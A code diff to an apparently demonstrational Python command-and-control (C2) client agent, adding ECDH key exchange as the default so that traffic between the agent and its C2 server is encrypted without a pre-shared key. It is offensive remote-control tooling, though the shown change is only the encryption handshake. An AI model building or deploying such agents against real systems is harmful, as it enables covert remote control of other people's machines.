@@ -35,25 +35,28 @@ class C2Client:
     """Demo C2 Client Agent"""
 
     def __init__(self, server_host: str, server_port: int,
-                 encryption_key: Optional[bytes] = None):
+                 encryption_key: Optional[bytes] = None, use_ecdh: bool = True):
         """
         Initialize C2 Client
 
         Args:
             server_host: C2 server hostname/IP
             server_port: C2 server port
-            encryption_key: Optional encryption key for secure communication
+            encryption_key: Optional encryption key for secure communication (PSK mode)
+            use_ecdh: If True, use ECDH key exchange instead of PSK
         """
         self.server_host = server_host
         self.server_port = server_port
-        self.protocol = ProtocolHandler(encryption_key)
+        self.use_ecdh = use_ecdh
+        self.encryption_key = encryption_key
+        self.protocol = None  # Will be initialized after connection
         self.executor = CommandExecutor()
         self.client_id: Optional[str] = None
         self.reader: Optional[asyncio.StreamReader] = None
         self.writer: Optional[asyncio.StreamWriter] = None
         self.running = True
         self.command_queue: asyncio.Queue = asyncio.Queue()
-        logger.info(f"C2 Client initialized (target: {server_host}:{server_port})")
+        logger.info(f"C2 Client initialized (target: {server_host}:{server_port}, encryption: {'ECDH' if use_ecdh else 'PSK' if encryption_key else 'None'})")
 
     async def connect(self) -> bool:
         """
@@ -68,6 +71,29 @@ class C2Client:
                 self.server_port
             )
             logger.info(f"Connected to C2 Server at {self.server_host}:{self.server_port}")
+
+            # Initialize protocol handler
+            if self.use_ecdh:
+                self.protocol = ProtocolHandler(use_ecdh=True)
+            else:
+                self.protocol = ProtocolHandler(self.encryption_key)
+
+            # Perform ECDH key exchange if enabled
+            if self.use_ecdh:
+                # Receive server's public key (32 bytes)
+                server_pubkey = await self.reader.read(32)
+                if len(server_pubkey) != 32:
+                    logger.error("Invalid server public key")
+                    return False
+
+                # Send client's public key
+                client_pubkey = self.protocol.get_public_key_bytes()
+                self.writer.write(client_pubkey)
+                await self.writer.drain()
+
+                # Derive shared encryption key
+                self.protocol.derive_shared_key(server_pubkey)
+                logger.info("ECDH key exchange completed")
 
             # Receive welcome message
             welcome = await self.protocol.read_message(self.reader)
@@ -267,7 +293,7 @@ async def main():
     client = C2Client(
         config.CLIENT_SERVER_HOST,
         config.CLIENT_SERVER_PORT,
-        encryption_key=config.ENCRYPTION_PSK
+        use_ecdh=True  # Use ECDH key exchange instead of PSK
     )
 
     try:
